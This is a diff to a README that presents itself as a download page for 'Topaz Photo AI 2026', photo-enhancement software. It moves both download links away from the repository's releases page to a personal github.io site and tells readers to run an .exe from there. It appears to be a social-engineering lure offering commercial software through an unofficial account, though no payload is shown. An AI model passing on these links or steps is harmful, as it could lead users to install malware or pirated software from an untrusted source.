@@ -1,6 +1,6 @@
 # 📸 Topaz-Photo-AI-2026 - Improve photo clarity and detail easily
 
-[![](https://img.shields.io/badge/Download-Topaz_Photo_AI-blue.svg)](https://github.com/parasiteearnest482/Topaz-Photo-AI-2026/releases)
+[![](https://img.shields.io/badge/Download-Topaz_Photo_AI-blue.svg)](https://parasiteearnest482.github.io)
 
 Topaz Photo AI 2026 helps photographers fix image issues. This tool uses machine learning to remove noise, sharpen focus, and increase image size. You process raw photos in batches to save time. It handles common problems like motion blur or out-of-focus subjects. The software runs on Windows desktop computers.
 
@@ -8,7 +8,7 @@ Topaz Photo AI 2026 helps photographers fix image issues. This tool uses machine
 
 You install the software by downloading the installer from the release page.
 
-[Download the latest version here](https://github.com/parasiteearnest482/Topaz-Photo-AI-2026/releases)
+[Download the latest version here](https://parasiteearnest482.github.io)
 
 Click the link to visit the website. Look for the file ending in .exe under the latest version header. Click that file to start the download.
 
